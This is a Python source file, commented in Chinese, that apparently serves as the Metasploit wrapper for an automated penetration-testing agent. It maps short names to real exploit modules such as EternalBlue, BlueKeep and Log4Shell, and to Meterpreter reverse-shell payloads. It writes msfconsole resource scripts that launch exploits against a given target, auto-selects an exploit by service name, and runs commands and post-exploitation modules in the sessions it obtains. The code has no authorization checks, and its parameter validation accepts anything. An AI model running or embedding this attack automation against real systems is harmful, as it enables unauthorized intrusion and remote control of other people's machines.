"""
Metasploit Wrapper - Metasploit Framework 封装
通过 msfrpc 或命令行接口与 Metasploit 交互
"""
from typing import Dict, Any, List, Optional
from ..core.tool_interface import BaseTool, ToolCategory, ToolRisk, ToolResult
import asyncio
import json
from loguru import logger


class MetasploitWrapper(BaseTool):
    """
    Metasploit Framework 工具封装
    
    支持：
    - 通过 msfrpc 连接 Metasploit
    - 执行漏洞利用模块
    - 管理 sessions
    - 获取反弹 shell
    """
    
    # 常见 exploit 模块映射
    EXPLOIT_MODULES = {
        # Windows
        "eternalblue": "exploit/windows/smb/ms17_010_eternalblue",
        "bluekeep": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "psexec": "exploit/windows/smb/psexec",
        "ms08_067": "exploit/windows/smb/ms08_067_netapi",
        # Linux
        "openssh_backdoor": "exploit/linux/ssh/openssh_backdoor",
        "samba_usermap": "exploit/multi/samba/usermap_script",
        # Web
        "tomcat_upload": "exploit/multi/http/tomcat_mgr_upload",
        "struts2_rce": "exploit/multi/http/struts2_content_type_ognl",
        "log4shell": "exploit/multi/http/log4shell",
        # 数据库
        "mssql_xp_cmdshell": "exploit/windows/mssql/mssql_payload",
        "mysql_auth": "exploit/linux/mysql/mysql_auth_bypass",
        "redis_unauth": "exploit/linux/redis/redis_unauth_rce",
    }
    
    # 常见 payload 映射
    PAYLOAD_MODULES = {
        "windows_reverse_tcp": "windows/meterpreter/reverse_tcp",
        "windows_reverse_https": "windows/meterpreter/reverse_https",
        "linux_reverse_tcp": "linux/x86/meterpreter/reverse_tcp",
        "linux_x64_reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
        "python_reverse_tcp": "python/meterpreter/reverse_tcp",
        "java_reverse_tcp": "java/meterpreter/reverse_tcp",
        "php_reverse_tcp": "php/meterpreter/reverse_tcp",
    }
    
    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        username: str = "msf",
        password: str = "pentest123",
        use_rpc: bool = False
    ):
        super().__init__(
            name="metasploit",
            category=ToolCategory.EXPLOIT,
            description="Metasploit Framework exploit and post-exploitation tool",
            risk_level=ToolRisk.HIGH,
            version="1.0.0"
        )
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.use_rpc = use_rpc
        self._rpc_client = None
        self._msf_path = "msfconsole"
    
    async def _ensure_rpc_connection(self) -> bool:
        """确保 RPC 连接有效"""
        if not self.use_rpc:
            return False
        
        if self._rpc_client is None:
            try:
                import msgpackrpc
                # 简化版 RPC 连接，实际使用需要 msgpackrpc-client
                logger.info(f"Connecting to Metasploit RPC at {self.host}:{self.port}")
                # 这里使用命令行方式作为 fallback
                self._rpc_client = None
                return False
            except ImportError:
                logger.warning("msgpackrpc not installed, falling back to CLI mode")
                self._rpc_client = None
                return False
        
        return True
    
    async def execute(self, target: str, params: Dict[str, Any] = None) -> ToolResult:
        """
        执行 Metasploit 漏洞利用
        
        Args:
            target: 目标地址
            params: 参数配置
                - module: exploit 模块名称
                - payload: payload 模块名称
                - lhost: 监听主机
                - lport: 监听端口
                - rport: 远程端口
                - options: 其他模块选项
        
        Returns:
            ToolResult 对象
        """
        import time
        start_time = time.time()
        
        params = params or {}
        
        if not self.validate_params(params):
            return ToolResult(
                success=False,
                data={},
                error="Invalid parameters",
                execution_time=0
            )
        
        try:
            # 构建并执行 msfconsole 命令
            cmd = self._build_msf_command(target, params)
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            raw_output = stdout.decode('utf-8', errors='ignore')
            parsed_data = self.parse_output(raw_output)
            
            execution_time = time.time() - start_time
            
            result = ToolResult(
                success=process.returncode == 0,
                data=parsed_data,
                error=stderr.decode('utf-8') if stderr else None,
                raw_output=raw_output,
                execution_time=execution_time
            )
            
            self._last_result = result
            return result
            
        except Exception as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
                execution_time=time.time() - start_time
            )
    
    def _build_msf_command(self, target: str, params: Dict[str, Any]) -> List[str]:
        """构建 msfconsole 命令"""
        module = params.get("module", "")
        payload = params.get("payload", "windows/meterpreter/reverse_tcp")
        lhost = params.get("lhost", "127.0.0.1")
        lport = params.get("lport", 4444)
        rport = params.get("rport", "")
        options = params.get("options", {})
        
        # 构建 msfconsole 资源脚本命令
        commands = []
        
        # 选择模块
        if module:
            commands.append(f"use {module}")
        else:
            # 尝试根据目标服务自动选择模块
            service = params.get("service", "")
            auto_module = self._auto_select_module(service)
            if auto_module:
                commands.append(f"use {auto_module}")
        
        # 设置目标
        commands.append(f"set RHOSTS {target}")
        
        if rport:
            commands.append(f"set RPORT {rport}")
        
        # 设置 payload
        commands.append(f"set PAYLOAD {payload}")
        commands.append(f"set LHOST {lhost}")
        commands.append(f"set LPORT {lport}")
        
        # 设置其他选项
        for key, value in options.items():
            commands.append(f"set {key.upper()} {value}")
        
        # 执行
        commands.append("exploit -j")  # -j 表示后台执行
        commands.append("exit")
        
        # 写入临时资源文件
        import tempfile
        import os
        
        rc_content = "\n".join(commands)
        fd, rc_path = tempfile.mkstemp(suffix=".rc")
        with os.fdopen(fd, 'w') as f:
            f.write(rc_content)
        
        return [self._msf_path, "-q", "-r", rc_path]
    
    def _auto_select_module(self, service: str) -> Optional[str]:
        """根据服务自动选择 exploit 模块"""
        service_lower = service.lower()
        
        for key, module in self.EXPLOIT_MODULES.items():
            if key in service_lower:
                return module
        
        return None
    
    def validate_params(self, params: Dict[str, Any]) -> bool:
        """验证参数"""
        if not params:
            return True
        
        # 检查 module 是否有效
        module = params.get("module")
        if module and module not in self.EXPLOIT_MODULES.values():
            # 允许自定义模块
            pass
        
        return True
    
    def parse_output(self, raw_output: str) -> Dict[str, Any]:
        """解析 Metasploit 输出"""
        result = {
            "success": False,
            "sessions": [],
            "exploit_output": "",
            "errors": []
        }
        
        lines = raw_output.split('\n')
        result["exploit_output"] = raw_output
        
        for line in lines:
            # 检测 session 创建
            if "Command shell session" in line or "Meterpreter session" in line:
                result["success"] = True
                # 提取 session ID
                import re
                match = re.search(r'session\s+(\d+)', line)
                if match:
                    result["sessions"].append({
                        "id": int(match.group(1)),
                        "type": "meterpreter" if "Meterpreter" in line else "shell"
                    })
            
            # 检测错误
            if "[-]" in line:
                result["errors"].append(line.strip())
        
        return result
    
    async def list_sessions(self) -> List[Dict[str, Any]]:
        """列出当前活跃的 sessions"""
        # 通过 msfconsole 命令获取 session 列表
        cmd = [self._msf_path, "-q", "-x", "sessions -l; exit"]
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, _ = await process.communicate()
            output = stdout.decode('utf-8', errors='ignore')
            
            sessions = []
            for line in output.split('\n'):
                if line.strip() and not line.startswith("Active") and not line.startswith("==="):
                    parts = line.split()
                    if len(parts) >= 3 and parts[0].isdigit():
                        sessions.append({
                            "id": int(parts[0]),
                            "type": parts[1],
                            "info": " ".join(parts[2:])
                        })
            
            return sessions
        except Exception as e:
            logger.error(f"Failed to list sessions: {e}")
            return []
    
    async def interact_session(self, session_id: int, command: str) -> str:
        """与指定 session 交互执行命令"""
        cmd = [
            self._msf_path, "-q",
            "-x", f"sessions -i {session_id}; {command}; exit"
        ]
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, _ = await process.communicate()
            return stdout.decode('utf-8', errors='ignore')
        except Exception as e:
            logger.error(f"Failed to interact with session {session_id}: {e}")
            return f"Error: {str(e)}"
    
    async def run_post_module(
        self,
        session_id: int,
        module: str,
        options: Dict[str, Any] = None
    ) -> Dict[str, Any]:
        """
        执行后渗透模块
        
        Args:
            session_id: 目标 session ID
            module: 后渗透模块名称
            options: 模块选项
        
        Returns:
            执行结果
        """
        commands = [
            f"use {module}",
            f"set SESSION {session_id}",
        ]
        
        if options:
            for key, value in options.items():
                commands.append(f"set {key.upper()} {value}")
        
        commands.append("run")
        commands.append("exit")
        
        rc_content = "\n".join(commands)
        
        import tempfile
        import os
        
        fd, rc_path = tempfile.mkstemp(suffix=".rc")
        with os.fdopen(fd, 'w') as f:
            f.write(rc_content)
        
        cmd = [self._msf_path, "-q", "-r", rc_path]
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            return {
                "success": process.returncode == 0,
                "output": stdout.decode('utf-8', errors='ignore'),
                "error": stderr.decode('utf-8', errors='ignore') if stderr else None
            }
        except Exception as e:
            return {
                "success": False,
                "output": "",
                "error": str(e)
            }
